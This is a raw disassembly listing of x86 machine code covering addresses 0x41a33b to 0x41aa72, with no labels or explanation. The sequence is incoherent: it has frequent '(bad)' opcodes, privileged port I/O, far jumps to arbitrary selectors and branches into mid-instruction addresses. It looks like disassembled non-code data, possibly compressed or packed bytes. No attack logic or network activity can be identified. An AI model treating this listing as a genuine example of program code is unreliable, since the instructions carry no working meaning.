  41a33b:	xchg   ecx,eax
  41a33c:	xchg   ebx,eax
  41a33d:	pop    ecx
  41a33e:	fs inc esi
  41a340:	inc    esi
  41a341:	and    bh,BYTE PTR ds:0xd1b2bed
  41a347:	adc    DWORD PTR [ecx+0x38],ecx
  41a34a:	jle    0x41a307
  41a34c:	dec    ebx
  41a34d:	(bad)  
  41a34e:	push   ss
  41a34f:	lahf   
  41a350:	std    
  41a351:	push   ss
  41a352:	dec    edi
  41a353:	mov    WORD PTR [edi+0x26],gs
  41a356:	lahf   
  41a357:	push   eax
  41a358:	lea    ebx,ds:0xf7bb1de7
  41a35e:	sub    al,0x61
  41a360:	xchg   BYTE PTR [edi-0x2],ah
  41a363:	cmc    
  41a364:	mov    ah,0xed
  41a366:	xor    esp,DWORD PTR [edx-0x2fe0ae78]
  41a36c:	and    BYTE PTR [eax-0x6c8ede3b],bl
  41a372:	stos   BYTE PTR es:[edi],al
  41a373:	pushf  
  41a374:	or     DWORD PTR ds:0xb5985479,esi
  41a37a:	call   edx
  41a37c:	pop    esi
  41a37d:	ins    DWORD PTR es:[edi],dx
  41a37e:	xchg   edx,eax
  41a37f:	mov    WORD PTR [ebx+0xc5e79b3],cs
  41a385:	sub    bh,BYTE PTR [ebx]
  41a387:	int3   
  41a388:	adc    al,0x21
  41a38a:	or     al,0x5e
  41a38c:	(bad)  
  41a38d:	mov    al,ds:0x10989268
  41a392:	(bad)  
  41a393:	aam    0x2
  41a395:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41a397:	jnp    0x41a32d
  41a399:	xchg   ecx,eax
  41a39a:	rcl    BYTE PTR ds:0x88a97478,1
  41a3a0:	jg     0x41a339
  41a3a2:	loope  0x41a356
  41a3a4:	add    eax,0xc5dd932
  41a3a9:	out    dx,al
  41a3aa:	into   
  41a3ab:	pop    ecx
  41a3ac:	mov    dh,dh
  41a3ae:	out    dx,al
  41a3af:	in     al,dx
  41a3b0:	std    
  41a3b1:	imul   ebp,DWORD PTR [eax+ebp*1-0x4e],0x1d41155b
  41a3b9:	dec    ebp
  41a3ba:	push   cs
  41a3bb:	ins    DWORD PTR es:[edi],dx
  41a3bc:	fild   WORD PTR [ebp+0x5cf5c9e8]
  41a3c2:	(bad)  
  41a3c3:	arpl   si,ax
  41a3c5:	pop    ds
  41a3c6:	add    edi,DWORD PTR [esp+edx*1+0x23]
  41a3ca:	aam    0x98
  41a3cc:	js     0x41a354
  41a3ce:	mov    ds,WORD PTR [esi+0x77]
  41a3d1:	bound  ebx,QWORD PTR [edx-0x2f461928]
  41a3d7:	idiv   DWORD PTR [esi+0x5e01e5c]
  41a3dd:	pop    eax
  41a3de:	or     ecx,DWORD PTR [ebx]
  41a3e0:	pop    edi
  41a3e1:	inc    edx
  41a3e3:	rcr    bl,1
  41a3e5:	fst    st(6)
  41a3e7:	sbb    al,0x3f
  41a3e9:	push   esi
  41a3ea:	pop    ecx
  41a3eb:	bound  esi,QWORD PTR [esi+0x1effcad8]
  41a3f1:	in     eax,0x22
  41a3f3:	test   DWORD PTR [ecx],0xeeebcccf
  41a3f9:	jge    0x41a3cc
  41a3fb:	sub    ecx,DWORD PTR [ebx]
  41a3fd:	out    dx,al
  41a3fe:	gs mov eax,ds
  41a401:	js     0x41a397
  41a403:	ins    BYTE PTR es:[edi],dx
  41a404:	inc    ebp
  41a405:	jno    0x41a419
  41a407:	mov    dh,0xbe
  41a409:	(bad)  
  41a40a:	out    dx,al
  41a40b:	and    DWORD PTR [edi],ebp
  41a40d:	jne    0x41a390
  41a40f:	push   es
  41a410:	nop
  41a411:	rcr    DWORD PTR [ebx],1
  41a413:	sti    
  41a414:	mov    esi,0x95de4b2a
  41a419:	in     eax,0xa3
  41a41b:	fld    DWORD PTR [edi+0x5e9e328f]
  41a421:	sub    ah,cl
  41a423:	jo     0x41a45e
  41a425:	or     al,0x54
  41a427:	fld    QWORD PTR [eax]
  41a429:	(bad)  
  41a42a:	add    BYTE PTR [esi-0x8],0x5
  41a42e:	adc    DWORD PTR [ecx-0x62],edi
  41a431:	add    dl,BYTE PTR [esi-0x7750c17a]
  41a437:	out    0xf3,al
  41a439:	and    al,0xd3
  41a43b:	iret   
  41a43c:	xchg   esi,eax
  41a43d:	fisubr DWORD PTR [edi]
  41a43f:	adc    al,0x2e
  41a441:	sub    DWORD PTR [ebx-0x2f],esi
  41a444:	cmp    edi,0xca5b0497
  41a44a:	mov    ebp,0x8840e4ac
  41a44f:	aaa    
  41a450:	lods   al,BYTE PTR ds:[esi]
  41a451:	xor    BYTE PTR [ebp+0x4cbea6e],cl
  41a457:	or     eax,0xb44e7fd6
  41a45c:	inc    ebp
  41a45d:	arpl   sp,cx
  41a45f:	rol    edx,cl
  41a461:	in     eax,0xcc
  41a463:	enter  0x21b8,0xba
  41a467:	and    al,0x28
  41a469:	cmp    BYTE PTR [edx+0x66],dl
  41a46c:	mov    edi,0x53399e03
  41a471:	push   esp
  41a472:	mov    esp,0x40960c44
  41a477:	inc    edi
  41a478:	mov    dl,0xbc
  41a47a:	inc    ecx
  41a47b:	adc    DWORD PTR [eax+0x47],0xdb934dc8
  41a482:	sub    ebx,DWORD PTR [esi]
  41a484:	or     eax,0x77daf5c0
  41a489:	stos   DWORD PTR es:[edi],eax
  41a48a:	sbb    bl,al
  41a48c:	push   edi
  41a48d:	sbb    BYTE PTR [esi*1+0x5e2c5c7d],ch
  41a494:	pusha  
  41a495:	sub    al,0x62
  41a497:	xor    BYTE PTR [eax+esi*8+0x5],ah
  41a49b:	ret    
  41a49c:	mov    ebx,DWORD PTR [esp+ebp*8-0x57]
  41a4a0:	and    cl,BYTE PTR [ecx]
  41a4a2:	cmp    esi,DWORD PTR [eax]
  41a4a4:	add    esi,esi
  41a4a6:	rol    DWORD PTR ds:0x5a73c956,0x59
  41a4ad:	jo     0x41a4f2
  41a4af:	adc    DWORD PTR [eax-0x43],esp
  41a4b2:	xchg   edx,eax
  41a4b3:	add    eax,0xe73cd85d
  41a4b8:	int3   
  41a4b9:	stos   BYTE PTR es:[edi],al
  41a4ba:	inc    ecx
  41a4bb:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41a4bd:	dec    esp
  41a4be:	dec    ebx
  41a4bf:	dec    ecx
  41a4c0:	shl    DWORD PTR [edx+0x61],cl
  41a4c3:	frstor [ebx-0x58]
  41a4c6:	ret    
  41a4c7:	mov    ebp,0x9becbc63
  41a4cc:	push   ebp
  41a4cd:	scas   al,BYTE PTR es:[edi]
  41a4ce:	lods   al,BYTE PTR ds:[esi]
  41a4cf:	inc    eax
  41a4d0:	repz mov bh,0x35
  41a4d3:	data16 out 0xb5,al
  41a4d6:	(bad)  
  41a4d7:	or     DWORD PTR ds:0xad9a61df,0x2
  41a4de:	dec    edx
  41a4df:	jo     0x41a4c0
  41a4e1:	gs in  al,0x9d
  41a4e4:	xor    edi,DWORD PTR [edx+edi*1]
  41a4e7:	xor    esp,esi
  41a4e9:	lds    edi,FWORD PTR [ecx+0x318c4e3f]
  41a4ef:	loopne 0x41a4b0
  41a4f1:	popa   
  41a4f2:	loopne 0x41a4b1
  41a4f4:	cmp    al,BYTE PTR [edi+0x5c]
  41a4f7:	pop    esi
  41a4f8:	jl     0x41a505
  41a4fa:	xor    ch,BYTE PTR [ecx+edi*8]
  41a4fd:	or     edi,DWORD PTR [edx+ebp*4+0x35]
  41a501:	in     eax,0xce
  41a503:	pop    ss
  41a504:	fcomi  st,st(4)
  41a506:	int3   
  41a507:	dec    edi
  41a508:	arpl   WORD PTR [ebp+0x3c],di
  41a50b:	adc    al,0x10
  41a50d:	(bad)  
  41a50e:	pusha  
  41a50f:	dec    ebp
  41a510:	adc    eax,0xaf15e59a
  41a515:	pop    edx
  41a516:	out    dx,al
  41a517:	jmp    0x7f93:0x4984efbf
  41a51e:	retf   
  41a51f:	cmp    eax,0xaf3f7034
  41a524:	adc    al,0x17
  41a526:	sub    ah,ah
  41a528:	sbb    ch,BYTE PTR [esi+0x65dd44a2]
  41a52e:	push   esp
  41a52f:	dec    esp
  41a530:	xchg   ebx,eax
  41a531:	test   DWORD PTR [eax],esp
  41a533:	xor    bh,BYTE PTR ds:0x830a0d1f
  41a539:	inc    eax
  41a53a:	aaa    
  41a53b:	cwde   
  41a53c:	imul   ebp,DWORD PTR [eax],0x5a
  41a53f:	mov    bh,0xa4
  41a541:	xchg   dh,dh
  41a543:	add    BYTE PTR [eax+edx*4-0x39],0xbc
  41a548:	iret   
  41a549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a54a:	push   ebx
  41a54b:	ret    
  41a54c:	out    dx,eax
  41a54d:	adc    BYTE PTR [edx+eax*8+0x6ab9d1ed],bh
  41a554:	xor    bl,ch
  41a556:	jns    0x41a5b3
  41a558:	inc    edi
  41a559:	mov    bl,0x16
  41a55b:	aam    0x56
  41a55d:	mov    WORD PTR [ebx-0xb],fs
  41a560:	(bad)  ds:[eax+0x7239fd3b]
  41a567:	cmp    ebx,DWORD PTR [eax-0x50]
  41a56a:	sbb    ah,dh
  41a56c:	xchg   esi,eax
  41a56d:	dec    ebp
  41a56e:	mov    ch,0xcc
  41a570:	call   0xf2c735de
  41a575:	mov    al,ds:0x28d1dc5e
  41a57a:	and    BYTE PTR [edi+0x35fbb754],0x3b
  41a581:	hlt    
  41a582:	and    eax,0xdbf72738
  41a587:	push   ecx
  41a588:	fs cmp al,bl
  41a58b:	jno    0x41a553
  41a58d:	or     eax,0x4dac1d08
  41a592:	pushf  
  41a593:	repnz or edi,DWORD PTR [edx+0x7]
  41a597:	adc    al,0x8d
  41a599:	test   BYTE PTR [ecx*4+0x48d1f389],dh
  41a5a0:	xor    eax,0xbec0611c
  41a5a5:	cdq    
  41a5a6:	iret   
  41a5a7:	(bad)  
  41a5a8:	mov    ah,0x65
  41a5aa:	out    dx,eax
  41a5ab:	icebp  
  41a5ac:	inc    ebp
  41a5ad:	lods   al,BYTE PTR ds:[esi]
  41a5ae:	push   es
  41a5af:	test   dl,al
  41a5b1:	dec    esp
  41a5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5b3:	aam    0x1f
  41a5b5:	mov    esi,DWORD PTR ds:0x4e579f3a
  41a5bb:	test   BYTE PTR [eax],0x73
  41a5be:	push   esi
  41a5bf:	jp     0x41a55f
  41a5c1:	jne    0x41a5b3
  41a5c3:	jo     0x41a55d
  41a5c5:	sub    al,BYTE PTR [ebx-0x18]
  41a5c8:	sti    
  41a5c9:	push   ds
  41a5ca:	mov    DWORD PTR [esi-0x53779214],ecx
  41a5d0:	addr16 das 
  41a5d2:	pop    ds
  41a5d3:	cld    
  41a5d4:	mov    eax,ds:0xcf659e84
  41a5d9:	inc    ebp
  41a5da:	fnstenv ds:0x9fd68f3f
  41a5e0:	xor    ecx,DWORD PTR [edi-0x5d]
  41a5e3:	or     BYTE PTR [edi],0xed
  41a5e6:	mov    ds:0x59cc2ec5,al
  41a5eb:	out    dx,eax
  41a5ec:	call   0xc134:0xf3ca4a4d
  41a5f3:	dec    ebx
  41a5f4:	out    0x6c,al
  41a5f6:	cs adc eax,0x19a2591f
  41a5fc:	jecxz  0x41a610
  41a5fe:	repz fs dec eax
  41a601:	pop    es
  41a602:	pop    eax
  41a603:	sub    esi,ebx
  41a605:	loop   0x41a66b
  41a607:	sar    cl,0xb3
  41a60a:	test   al,0x53
  41a60c:	mov    ebp,0x70ce3b1
  41a611:	sbb    bl,BYTE PTR [edi-0x4ee9f727]
  41a617:	jns    0x41a684
  41a619:	inc    esi
  41a61a:	dec    eax
  41a61b:	mov    ecx,DWORD PTR [ebx+esi*1]
  41a61e:	dec    eax
  41a61f:	pop    ebp
  41a620:	add    DWORD PTR [edi+0x42729d7b],esp
  41a626:	sub    BYTE PTR [edi],al
  41a628:	xchg   DWORD PTR [esi+0x5e],edi
  41a62b:	xor    al,0x64
  41a62d:	ins    BYTE PTR es:[edi],dx
  41a62e:	iret   
  41a62f:	add    al,0x99
  41a631:	mov    ecx,0x486a89e
  41a636:	push   edx
  41a637:	cmp    eax,0x6bdbe736
  41a63c:	push   ecx
  41a63d:	or     eax,0xc7e9f557
  41a642:	imul   esi,ebp,0x203112cc
  41a648:	fsub   DWORD PTR [ebx]
  41a64a:	cdq    
  41a64b:	sub    eax,0x3fea1144
  41a650:	ret    0x5184
  41a653:	inc    edx
  41a654:	mov    ah,ch
  41a656:	jmp    0x41a6ac
  41a658:	hlt    
  41a659:	xchg   esi,eax
  41a65a:	mov    edi,0xa3c2b7
  41a65f:	icebp  
  41a660:	mov    ds:0x6709cc3a,al
  41a665:	add    edx,DWORD PTR [eax-0x310e74bb]
  41a66b:	cdq    
  41a66c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a66d:	and    al,0x38
  41a66f:	out    dx,al
  41a670:	sbb    eax,0x22aedf22
  41a675:	mov    ?,WORD PTR [ebx+0x18]
  41a678:	xchg   edx,eax
  41a679:	add    DWORD PTR [esi-0x45],ebx
  41a67c:	fsub   st(6),st
  41a67e:	xor    al,0x15
  41a680:	mov    bh,0xa5
  41a682:	cld    
  41a683:	push   0xf961b59d
  41a688:	cmc    
  41a689:	imul   ebp,DWORD PTR [edx],0xed8909a6
  41a68f:	fs enter 0xa1dd,0x28
  41a694:	adc    DWORD PTR [ebp+0x46],edx
  41a697:	mov    bl,0x5e
  41a699:	into   
  41a69a:	int3   
  41a69b:	xchg   DWORD PTR [edx],ebx
  41a69d:	neg    DWORD PTR [eax-0x647c1370]
  41a6a3:	sbb    esi,ebp
  41a6a5:	and    ebp,ebx
  41a6a7:	push   ss
  41a6a8:	pop    ss
  41a6a9:	bound  eax,QWORD PTR [ecx+0x68fee958]
  41a6af:	mov    dl,0x5
  41a6b1:	dec    ecx
  41a6b2:	(bad)  
  41a6b3:	cmp    dx,si
  41a6b6:	jge    0x41a67e
  41a6b8:	xchg   esi,eax
  41a6b9:	jmp    0xdf7d:0xc763b4b0
  41a6c0:	retf   
  41a6c1:	sub    ebx,ebp
  41a6c3:	fs add eax,0x803472a8
  41a6c9:	loope  0x41a703
  41a6cb:	call   0xfd2aa92
  41a6d0:	sti    
  41a6d1:	mov    al,0xb7
  41a6d3:	and    BYTE PTR [edx+0x30],ah
  41a6d6:	cmp    DWORD PTR [ecx],esp
  41a6d8:	addr16 mov ebp,0x8a916093
  41a6de:	or     edi,ebp
  41a6e0:	lds    edi,FWORD PTR [ebp+0xcf07ac]
  41a6e6:	(bad)  
  41a6e8:	stos   DWORD PTR es:[edi],eax
  41a6e9:	ficomp DWORD PTR [edx]
  41a6eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6ec:	jg     0x41a690
  41a6ee:	mov    edi,0x8c55e8ca
  41a6f3:	mov    dl,0xf9
  41a6f5:	in     eax,dx
  41a6f6:	retf   
  41a6f7:	popa   
  41a6f8:	fldcw  WORD PTR [edx-0x3c131ef9]
  41a6fe:	adc    BYTE PTR [esi+0x22],bh
  41a701:	lahf   
  41a702:	ins    BYTE PTR es:[edi],dx
  41a703:	outs   dx,DWORD PTR ds:[esi]
  41a704:	hlt    
  41a705:	cmp    DWORD PTR ds:[ecx],ebx
  41a708:	or     al,0x9d
  41a70a:	xchg   edx,eax
  41a70b:	xchg   cl,al
  41a70d:	enter  0xda65,0x1c
  41a711:	dec    esp
  41a712:	sahf   
  41a713:	fistp  DWORD PTR [ebp+eiz*1+0x7f]
  41a717:	mov    eax,0x308756e
  41a71c:	xchg   DWORD PTR [edi],ecx
  41a71e:	ins    BYTE PTR es:[edi],dx
  41a71f:	jge    0x41a6f4
  41a721:	call   0x51a6a2ab
  41a726:	mov    bl,BYTE PTR [esi+0x40]
  41a729:	push   edi
  41a72a:	shl    BYTE PTR [esi-0x33af5565],0xef
  41a731:	jae    0x41a781
  41a733:	sbb    BYTE PTR [eax-0x5ba30432],bl
  41a739:	sub    eax,0x64ce1a08
  41a73e:	and    BYTE PTR [ebp+0x4f],ch
  41a741:	sub    ch,al
  41a743:	sahf   
  41a744:	(bad)  
  41a745:	push   eax
  41a746:	mov    bl,0x88
  41a748:	adc    al,0x12
  41a74a:	xchg   edi,eax
  41a74b:	jl     0x41a77b
  41a74d:	mov    dh,0xed
  41a74f:	js     0x41a777
  41a751:	pop    esp
  41a752:	or     dl,bl
  41a754:	call   0xf7ba:0x12a8a9c0
  41a75b:	scas   al,BYTE PTR es:[edi]
  41a75c:	mov    ?,WORD PTR [ebx+0x2ddbcfd8]
  41a762:	mov    ds:0x7674cc14,al
  41a767:	mov    ds:0xc20d1450,eax
  41a76c:	mov    al,0xd7
  41a76e:	outs   dx,DWORD PTR ds:[esi]
  41a76f:	push   cs
  41a770:	int3   
  41a771:	jecxz  0x41a7f0
  41a773:	mov    ch,BYTE PTR [ecx+edi*2-0x36]
  41a777:	pop    ss
  41a778:	adc    edx,ebp
  41a77a:	inc    ebp
  41a77b:	ja     0x41a77e
  41a77d:	jp     0x41a711
  41a77f:	mov    bh,BYTE PTR [edi]
  41a781:	test   al,0x56
  41a783:	imul   ecx,edi,0x37
  41a786:	and    DWORD PTR ds:0x3712a112,0x7ee271d
  41a790:	std    
  41a791:	adc    ebp,DWORD PTR [eax]
  41a793:	(bad)  
  41a794:	enter  0xd765,0x14
  41a798:	ret    0xbbd3
  41a79b:	sbb    al,0x89
  41a79d:	mov    dh,0xad
  41a79f:	loope  0x41a793
  41a7a1:	fwait
  41a7a2:	xchg   esp,eax
  41a7a3:	mov    ebx,0xf4613444
  41a7a8:	out    dx,al
  41a7a9:	pushf  
  41a7aa:	test   al,0xe7
  41a7ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7ad:	sub    dl,bh
  41a7af:	push   eax
  41a7b0:	mov    al,0x2a
  41a7b2:	mov    edx,0xfca5cad5
  41a7b7:	and    al,BYTE PTR [ecx+0x34]
  41a7ba:	dec    ebp
  41a7bb:	inc    eax
  41a7bc:	mov    eax,ds:0x66f7824c
  41a7c1:	test   ah,dh
  41a7c3:	mov    al,0x42
  41a7c5:	loop   0x41a7a2
  41a7c7:	das    
  41a7c8:	cmp    ch,BYTE PTR [eax-0x76335d2]
  41a7ce:	adc    eax,DWORD PTR [ebx]
  41a7d0:	aad    0xe0
  41a7d2:	inc    ebp
  41a7d3:	push   ds
  41a7d4:	pop    edi
  41a7d5:	out    dx,eax
  41a7d6:	sahf   
  41a7d7:	sub    bh,BYTE PTR [edx]
  41a7d9:	add    ecx,edx
  41a7db:	ror    DWORD PTR [edi],1
  41a7dd:	add    DWORD PTR ss:[ecx],ecx
  41a7e0:	popf   
  41a7e1:	leave  
  41a7e2:	aad    0x74
  41a7e4:	sub    DWORD PTR [edx],esp
  41a7e6:	hlt    
  41a7e7:	sbb    BYTE PTR [ebp+0x32],bl
  41a7ea:	inc    ebp
  41a7eb:	or     al,0x9
  41a7ed:	or     bl,bh
  41a7ef:	jns    0x41a790
  41a7f1:	dec    edi
  41a7f2:	and    eax,0x2f713a9b
  41a7f7:	push   eax
  41a7f8:	inc    edi
  41a7f9:	and    bh,bh
  41a7fb:	int    0xfb
  41a7fd:	clc    
  41a7fe:	sub    BYTE PTR [edx+edi*1-0x7ff3d9ad],ch
  41a805:	je     0x41a833
  41a807:	jle    0x41a869
  41a809:	dec    ecx
  41a80a:	fxch   st(4)
  41a80c:	mov    ebx,0xec68ceaf
  41a811:	cmp    bh,BYTE PTR fs:[edx+0x2e43e5af]
  41a818:	bound  ecx,QWORD PTR [ecx]
  41a81a:	pop    ebp
  41a81b:	outs   dx,BYTE PTR ds:[esi]
  41a81c:	leave  
  41a81d:	inc    esi
  41a81e:	shr    DWORD PTR [eax-0x67599292],1
  41a824:	out    dx,al
  41a825:	sti    
  41a826:	mov    al,0xec
  41a828:	pusha  
  41a829:	rcr    DWORD PTR [ecx],cl
  41a82b:	test   al,0x3f
  41a82d:	inc    edi
  41a82e:	fcom   QWORD PTR [edi+0x3eb4482d]
  41a834:	fcomp  DWORD PTR [ecx]
  41a836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a837:	or     dh,dh
  41a839:	jo     0x41a82a
  41a83b:	mov    eax,ds:0x730511b5
  41a840:	imul   ebx,DWORD PTR [edx-0x59bae092],0xffffffdc
  41a847:	xor    cl,ch
  41a849:	xchg   edx,eax
  41a84a:	jns    0x41a811
  41a84c:	inc    ecx
  41a84d:	out    dx,eax
  41a84e:	arpl   bp,di
  41a850:	mov    esp,0xaa18992c
  41a855:	inc    edi
  41a856:	mov    ecx,0x8e32b08
  41a85b:	icebp  
  41a85c:	dec    ebx
  41a85d:	jnp    0x41a864
  41a85f:	out    dx,al
  41a860:	or     DWORD PTR [ecx],ebp
  41a862:	jne    0x41a83f
  41a864:	call   0x4e52:0x1988fba5
  41a86b:	mov    ecx,0xcb09a028
  41a870:	gs and eax,0x333ad4b3
  41a876:	fwait
  41a877:	(bad)  
  41a878:	lahf   
  41a879:	xchg   edx,eax
  41a87a:	and    BYTE PTR [esi-0x5c],bl
  41a87d:	call   FWORD PTR [edi-0x8]
  41a880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a881:	sub    ebp,DWORD PTR [ebx]
  41a883:	test   DWORD PTR [ebx+0x19],ecx
  41a886:	scas   al,BYTE PTR es:[edi]
  41a887:	sub    eax,0x2a2a775
  41a88c:	pop    ebx
  41a88d:	scas   eax,DWORD PTR es:[edi]
  41a88e:	outs   dx,BYTE PTR ds:[esi]
  41a88f:	xor    al,0x91
  41a891:	std    
  41a892:	popa   
  41a893:	loopne 0x41a816
  41a895:	cmp    eax,0x15517673
  41a89a:	out    dx,eax
  41a89b:	retf   0xc0ca
  41a89e:	xor    DWORD PTR es:[edx-0x19],ecx
  41a8a2:	in     eax,dx
  41a8a3:	jg     0x41a8f7
  41a8a5:	aas    
  41a8a6:	mov    ds:0xeb8f979b,al
  41a8ab:	fidiv  DWORD PTR [esi-0x457b4cb8]
  41a8b1:	ficomp DWORD PTR [ebp+0x25c56a8c]
  41a8b7:	lods   al,BYTE PTR ds:[esi]
  41a8b8:	push   es
  41a8b9:	mov    esi,0xa8065fe2
  41a8be:	repnz outs dx,BYTE PTR ds:[esi]
  41a8c0:	stos   BYTE PTR es:[edi],al
  41a8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c2:	imul   edi,DWORD PTR [ecx],0x1a
  41a8c5:	sbb    eax,0x9209c9c3
  41a8ca:	add    ebp,esp
  41a8cc:	pusha  
  41a8cd:	jp     0x41a8e2
  41a8cf:	retf   
  41a8d0:	inc    esp
  41a8d1:	(bad)  
  41a8d2:	sub    edi,ebx
  41a8d4:	retf   
  41a8d5:	fadd   DWORD PTR [edi+0x6a]
  41a8d8:	outs   dx,DWORD PTR ds:[esi]
  41a8d9:	cmp    eax,0xd683e054
  41a8de:	mul    ah
  41a8e0:	xchg   edx,eax
  41a8e1:	clc    
  41a8e2:	(bad)  
  41a8e3:	mov    edx,0xe0fae794
  41a8e8:	(bad)  
  41a8e9:	jnp    0x41a936
  41a8eb:	cld    
  41a8ec:	cmp    BYTE PTR [esi],dl
  41a8ee:	in     eax,dx
  41a8ef:	out    0x41,eax
  41a8f1:	mov    ds:0x71b0b7f4,al
  41a8f6:	into   
  41a8f7:	dec    ebx
  41a8f8:	and    bl,BYTE PTR [eax+ecx*1+0x3cfa9de2]
  41a8ff:	inc    esi
  41a900:	popf   
  41a901:	xchg   ecx,eax
  41a902:	add    BYTE PTR [edi-0x69],dl
  41a905:	ror    DWORD PTR [eax],1
  41a907:	push   0x56
  41a909:	imul   edx,eax,0x75
  41a90c:	(bad)  
  41a90d:	jns    0x41a8ac
  41a90f:	fidiv  DWORD PTR [esi+0x22005326]
  41a915:	pop    esp
  41a916:	stos   BYTE PTR es:[edi],al
  41a917:	push   edx
  41a918:	outs   dx,BYTE PTR ds:[esi]
  41a919:	inc    ecx
  41a91a:	out    dx,eax
  41a91b:	dec    eax
  41a91c:	inc    esp
  41a91d:	out    0xa8,al
  41a91f:	pusha  
  41a920:	adc    ebx,esi
  41a922:	and    cl,ch
  41a924:	xchg   ebp,eax
  41a925:	mov    esp,esi
  41a927:	test   BYTE PTR [edx-0x49783f17],bl
  41a92d:	inc    esi
  41a92e:	jl     0x41a8b5
  41a930:	push   0x25
  41a932:	hlt    
  41a933:	mov    ss,WORD PTR [edi+0x57]
  41a936:	imul   eax,DWORD PTR [edx+0x5c3cc125],0xca0926e0
  41a940:	scas   eax,DWORD PTR es:[edi]
  41a941:	and    ch,BYTE PTR [eax+0x6383341f]
  41a947:	pop    edi
  41a948:	in     eax,0xb7
  41a94a:	repz cmp dl,ah
  41a94d:	stos   DWORD PTR es:[edi],eax
  41a94e:	sbb    dl,BYTE PTR [ebx-0x52c7180a]
  41a954:	icebp  
  41a955:	adc    bh,BYTE PTR [esi]
  41a957:	das    
  41a958:	fwait
  41a959:	cdq    
  41a95a:	data16 sbb bl,dl
  41a95d:	and    ah,dh
  41a95f:	cld    
  41a960:	lods   eax,DWORD PTR ds:[esi]
  41a961:	add    eax,0x45a2668e
  41a966:	addr16 retf 
  41a968:	and    al,0xa3
  41a96a:	sbb    DWORD PTR [eax],edx
  41a96c:	pop    es
  41a96d:	sub    esp,DWORD PTR [ebp-0x1c157715]
  41a973:	or     ecx,DWORD PTR [ebp-0x36a689fc]
  41a979:	add    DWORD PTR [eax+0x5d],0x4f93cad0
  41a980:	mov    dh,0x71
  41a982:	and    DWORD PTR [edx+0x605319d9],edx
  41a988:	dec    esi
  41a989:	mov    cl,0xda
  41a98b:	jecxz  0x41aa01
  41a98d:	sub    al,0x16
  41a98f:	push   ecx
  41a990:	aaa    
  41a991:	add    esi,esp
  41a993:	add    ecx,DWORD PTR [ecx+ebp*4]
  41a996:	jge    0x41a92f
  41a998:	jne    0x41a94b
  41a99a:	call   0x8d840ba6
  41a99f:	ret    0x700d
  41a9a2:	(bad)  
  41a9a4:	std    
  41a9a5:	lods   al,BYTE PTR ds:[esi]
  41a9a6:	sub    eax,0xf9eca534
  41a9ab:	aad    0x2c
  41a9ad:	in     al,0xe4
  41a9af:	xor    dl,BYTE PTR [esi+0x4ddedb00]
  41a9b5:	scas   eax,DWORD PTR es:[edi]
  41a9b6:	stos   BYTE PTR es:[edi],al
  41a9b7:	outs   dx,DWORD PTR ds:[esi]
  41a9b8:	sub    DWORD PTR ds:0xff4cf3ad,edx
  41a9be:	or     esi,ebx
  41a9c0:	push   esp
  41a9c1:	int    0xba
  41a9c3:	xchg   edx,eax
  41a9c4:	mov    ds:0xf89fd243,eax
  41a9c9:	retf   0x595d
  41a9cc:	or     cl,BYTE PTR [esi]
  41a9ce:	add    eax,0x89134571
  41a9d3:	sbb    al,BYTE PTR [ecx+0x6]
  41a9d6:	test   al,0xca
  41a9d8:	lods   eax,DWORD PTR ds:[esi]
  41a9d9:	fisttp WORD PTR [edi-0x61]
  41a9dc:	xchg   ebp,eax
  41a9dd:	jmp    0x52409ca5
  41a9e2:	outs   dx,DWORD PTR ds:[esi]
  41a9e3:	clc    
  41a9e4:	daa    
  41a9e5:	push   cs
  41a9e6:	xor    al,0xbb
  41a9e8:	pop    ecx
  41a9e9:	xchg   edx,eax
  41a9ea:	loop   0x41a9dd
  41a9ec:	mov    cl,BYTE PTR [edi]
  41a9ee:	dec    eax
  41a9f0:	adc    cl,BYTE PTR [ecx+0x58337f34]
  41a9f6:	nop    DWORD PTR [edi-0x65]
  41a9fa:	and    esp,DWORD PTR [ebx-0x23]
  41a9fd:	aam    0xd6
  41a9ff:	ja     0x41a9b5
  41aa01:	xchg   esp,eax
  41aa02:	in     eax,dx
  41aa03:	push   ebp
  41aa04:	and    ah,BYTE PTR [ebx+0x49]
  41aa07:	cwde   
  41aa08:	dec    ecx
  41aa09:	out    0xd,al
  41aa0b:	ss ins DWORD PTR es:[edi],dx
  41aa0d:	mov    dl,0xf8
  41aa0f:	ficom  WORD PTR [edx+0x4c]
  41aa12:	sub    ah,BYTE PTR [esi-0x446d4217]
  41aa18:	and    eax,0x6548391b
  41aa1d:	mov    ds:0x3b65327b,eax
  41aa22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa23:	fs in  al,0x15
  41aa26:	repnz sub DWORD PTR [ecx+0x1b],edi
  41aa2a:	mov    ebx,0x4c38962a
  41aa2f:	inc    BYTE PTR [ebx]
  41aa31:	ins    DWORD PTR es:[edi],dx
  41aa32:	adc    al,0xc5
  41aa34:	push   eax
  41aa35:	jnp    0x41aa23
  41aa37:	into   
  41aa38:	xlat   BYTE PTR ds:[ebx]
  41aa39:	test   al,0x8e
  41aa3b:	jb     0x41a9e6
  41aa3d:	into   
  41aa3e:	fnstenv [ebx]
  41aa40:	es jns 0x41aa5f
  41aa43:	push   es
  41aa44:	mov    BYTE PTR [esi+0xd09ce54],cl
  41aa4a:	and    BYTE PTR [ecx-0x6a],ch
  41aa4d:	popfw  
  41aa4f:	push   ss
  41aa50:	xchg   edi,eax
  41aa51:	push   es
  41aa52:	stc    
  41aa53:	lods   eax,DWORD PTR ds:[esi]
  41aa54:	scas   al,BYTE PTR es:[edi]
  41aa55:	cmp    eax,0xe2def0ae
  41aa5a:	in     al,0xa5
  41aa5c:	ds inc edx
  41aa5e:	or     BYTE PTR [edx+0x74],dl
  41aa61:	mov    ebx,0xeea0d753
  41aa66:	jno    0x41aa89
  41aa68:	push   ebp
  41aa69:	scas   al,BYTE PTR es:[edi]
  41aa6a:	mov    al,0x1c
  41aa6c:	inc    eax
  41aa6d:	push   esp
  41aa6e:	pop    eax
  41aa6f:	imul   ebx,DWORD PTR [ebx],0x64
  41aa72:	jl     0x41aa4d
